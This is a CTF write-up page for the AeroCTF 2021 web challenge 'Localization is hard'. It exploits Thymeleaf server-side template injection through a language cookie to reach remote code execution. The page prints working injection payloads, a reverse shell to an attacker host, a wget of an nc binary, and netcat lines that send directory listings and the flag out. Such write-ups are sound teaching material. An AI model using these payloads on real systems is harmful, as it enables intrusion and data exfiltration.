@@ -1,0 +1,198 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[AeroCTF 2021 - web] Localization is hard // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.81.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[AeroCTF 2021 - web] Localization is hard"/>
+<meta name="twitter:description" content="[Localization is hard - web] AeroCTF 0x00 To solve this challenge we had to exploit a SSTI on Thymeleaf and lead that into a Remote Code Execution
+0x01 Discovering the vulnerability The challenge description talk about a Coffee who made for CTFers and in English and in Russian.
+Btw , the challenge description tell us that the flag should be located at / on the file system, this maybe mean that we have to get an access to the machine to read the flag."/>
+
+    <meta property="og:title" content="[AeroCTF 2021 - web] Localization is hard" />
+<meta property="og:description" content="[Localization is hard - web] AeroCTF 0x00 To solve this challenge we had to exploit a SSTI on Thymeleaf and lead that into a Remote Code Execution
+0x01 Discovering the vulnerability The challenge description talk about a Coffee who made for CTFers and in English and in Russian.
+Btw , the challenge description tell us that the flag should be located at / on the file system, this maybe mean that we have to get an access to the machine to read the flag." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/localization_is_hard_wu/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-03-02T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-03-02T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/nasm_re" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[AeroCTF 2021 - web] Localization is hard</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 2, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/web/">web</a>
+              <a class="tag" href="https://ret2school.github.io/tags/java/">java</a>
+              <a class="tag" href="https://ret2school.github.io/tags/ssti/">ssti</a>
+              <a class="tag" href="https://ret2school.github.io/tags/thymeleaf/">Thymeleaf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/2021/">2021</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="localization-is-hard---web-aeroctf">[Localization is hard - web] AeroCTF</h1>
+<h2 id="0x00">0x00</h2>
+<p>To solve this challenge we had to exploit a <strong><a href="https://portswigger.net/research/server-side-template-injection">SSTI</a></strong> on <strong>Thymeleaf</strong> and lead that into a <strong>Remote Code Execution</strong></p>
+<h2 id="0x01">0x01</h2>
+<h4 id="discovering-the-vulnerability">Discovering the vulnerability</h4>
+<p>The challenge description talk about a Coffee who made for CTFers and in <strong>English and in Russian</strong>.</p>
+<p><img src="https://i.imgur.com/88wE70b.png" alt="CTF description"></p>
+<p>Btw , the challenge description tell us that the flag should be located at <code>/</code> on the file system, this maybe mean that we have to get an access to the machine to read the flag.</p>
+<p>By inspecting the website we can read that the language can be choosed by clicking on a button.
+<code>(onclick</code> event), then the <code>set_language(lang)</code> function will be executed</p>
+<p><em>(quick look into the /js/templatemo-script.js)</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">
+<span style="color:#8be9fd;font-style:italic">function</span> set_language(lang) {
+  <span style="color:#8be9fd;font-style:italic">document</span>.cookie <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;lang=&#34;</span> <span style="color:#ff79c6">+</span> lang;
+  <span style="color:#8be9fd;font-style:italic">window</span>.location.reload();
+}
+
+</code></pre></div><p>the function set a cookie <code>lang</code> with <code>en</code> or <code>ru</code></p>
+<p><em>trying a path traversal   &ldquo;../flag/&quot;</em></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+curl http://151.236.114.211:7878/ --cookie <span style="color:#f1fa8c">&#34;lang=en&#34;</span>
+
+</code></pre></div><p><img src="https://i.imgur.com/wwxbzN0.png" alt="response">
+&ldquo;<strong>org.thymeleaf.exceptions.TemplateInputException</strong>&rdquo; by googling this error message, we find : <a href="https://www.thymeleaf.org/"><strong>thymeleaf</strong></a> .
+This a modern server-side Java template engine for both web and standalone environments.</p>
+<h2 id="0x02">0x02</h2>
+<h4 id="find-out-about-this-template-engine">Find out about this Template-Engine</h4>
+<p>Assuming <strong>Thymeleaf</strong> as a template engine , we can think about a <em><strong>Server-side template injection</strong></em>.
+So searching about SSTI on this template engine
+<strong>&raquo;</strong> <a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/">https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/</a>
+<strong>&raquo;</strong> <a href="https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability">https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability</a>
+<strong>&raquo;</strong> <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#thymeleaf-java</a></p>
+<h4 id="exploitation">Exploitation</h4>
+<p>To attempt an SSTI in Thymeleaf, we first must understand expressions that appear in Thymeleaf attributes. Thymeleaf expressions can have the following types:</p>
+<p><code>${...}</code>: Variable expressions – in practice, these are OGNL or Spring EL expressions.
+<code>*{...}</code>: Selection expressions – similar to variable expressions but used for specific purposes.
+<code>#{...}</code>: Message (i18n) expressions – used for internationalization.
+<code>@{...}</code>: Link (URL) expressions – used to set correct URLs/paths in the application.
+<code>~{...}</code>: Fragment expressions – they let you reuse parts of templates.</p>
+<ul>
+<li><code>__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}__::.x</code></li>
+<li><code>__${T(java.lang.Runtime).getRuntime().exec(&quot;whoami&quot;)}__::.x</code></li>
+</ul>
+<p>According <a href="https://www.acunetix.com/">Acunetix</a>. However, as we mentioned before, expressions only work in special Thymeleaf attributes. If it’s necessary to use an expression in a different location in the template, Thymeleaf supports <em>expression inlining</em>. To use this feature, you must put an expression within <code>[[...]]</code> or <code>[(...)]</code> (select one or the other depending on whether you need to escape special symbols). Therefore, a simple SSTI detection payload for Thymeleaf would be <code>[[${7*7}]]</code>.</p>
+<p>So let&rsquo;s try on the site cookie to check the <strong>RCE</strong>
+<code>__%24%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7D__%3A%3A.x</code></p>
+<p><img src="https://i.imgur.com/4ywvJ38.png" alt="response 500">
+We don&rsquo;t have the <strong>stdout</strong> in the response but we always have a 500 response.</p>
+<p>It&rsquo;s maybe blind based, so let&rsquo;s try to sleep.
+<img src="https://i.imgur.com/W8J1WHE.png" alt="sleep server">
+It&rsquo;s work !</p>
+<p>So now, we understand that :
+when we got <code>org.thymeleaf.exceptions.TemplateInputException</code> this mean that the command is executed, but when we send a bad command or a non-urlencoded payload we got <code>java.lang.IllegalArgumentException</code></p>
+<h2 id="0x03">0x03</h2>
+<h4 id="connect-to-our-machine">Connect to our machine</h4>
+<p>We tried firstly to do a simple tcp reverse shell with</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
+__%24%7Bnew%20java.util.Scanner<span style="color:#ff79c6">(</span>T<span style="color:#ff79c6">(</span>java.lang.Runtime<span style="color:#ff79c6">)</span>.getRuntime<span style="color:#ff79c6">()</span>.exec<span style="color:#ff79c6">(</span>%22%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fmyip%2F1337%200%3E%261%22<span style="color:#ff79c6">)</span>.getInputStream<span style="color:#ff79c6">())</span>.next<span style="color:#ff79c6">()</span>%7D__%3A%3A.x
+
+</code></pre></div><p>But nothing&hellip;
+So let&rsquo;s try to wget a nc binary on our machine</p>
+<p><code>__%24%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22wget%20ip/nc%22).getInputStream()).next()%7D__%3A%3A.x</code></p>
+<p>and now try to bind shell our machine..
+<img src="https://i.imgur.com/aburDce.png" alt="receive connexion">
+Bingo ! We got a connexion from the machine, but nothing in the output.</p>
+<h4 id="getting-a-shell-environment-from-runtimeexec">Getting a shell environment from Runtime.exec</h4>
+<p>According <a href="https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html">code white</a>
+The command passed to <code>Runtime.exec</code> is not executed by a shell. Instead, if you dig down though the Java source code, you&rsquo;ll end up in the <a href="http://hg.openjdk.java.net/jdk7/jdk7/jdk/file/tip/src/solaris/classes/java/lang/UNIXProcess.java.linux">_UNIX process class</a>, which reveals that calling <code>Runtime.exec</code> results in a <code>fork</code> and <code>exec</code> call on Unix platforms.</p>
+<p>Exemple:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">
+<span style="color:#ff79c6">import</span> java.io.*<span style="color:#ff79c6">;</span>
+
+<span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Exec</span> <span style="color:#ff79c6">{</span>
+
+       <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException <span style="color:#ff79c6">{</span>
+               Process p <span style="color:#ff79c6">=</span> Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span>args<span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]);</span>
+               <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> b <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">];</span>
+
+               <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">(</span>p<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getErrorStream</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">read</span><span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">&gt;</span> 0<span style="color:#ff79c6">)</span>
+                   System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">write</span><span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
+
+               <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">(</span>p<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getInputStream</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">read</span><span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">&gt;</span> 0<span style="color:#ff79c6">)</span>
+                   System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">write</span><span style="color:#ff79c6">(</span>b<span style="color:#ff79c6">);</span>
+       <span style="color:#ff79c6">}</span>
+
+<span style="color:#ff79c6">}</span>
+
+</code></pre></div><p>We call this class as shown below with single quotes around the command line to ensure that our shell passes the command line argument to Java as is:</p>
+<p>$ java Exec &lsquo;command arg1 arg2 &hellip;&rsquo;
+So let&rsquo;s try to use this to read our flag :
+<code>__%24%7Bnew%20java.util.Scanner%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22sh%20-c%20%24%40%7Csh%20.%20echo%20ls%20-la%20%2F%7C%20nc%20ip%201337%22%29.getInputStream%28%29%29.next%28%29%7D__%3A%3A.x</code></p>
+<p><strong>url decoded payload</strong>  <code>__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;sh -c $@|sh . echo ls -la /| nc ip 1337&quot;).getInputStream()).next()}__::.x</code></p>
+<p><img src="https://i.imgur.com/IGqCDZC.png" alt="ls -la"></p>
+<p>Now cat the flag :
+<code>__%24%7Bnew%20java.util.Scanner%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22sh%20-c%20%24%40%7Csh%20.%20cat%20%2Ftry_find_me.txt%7C%20nc%20ip%201337%22%29.getInputStream%28%29%29.next%28%29%7D__%3A%3A.x</code></p>
+<p><img src="https://i.imgur.com/IxSBfpt.png" alt="flag"></p>
+<p><strong>Aero{j4va_1s_better_th4n_engl1sh}</strong></p>
+<p>Cheers, @0x22sh =)</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
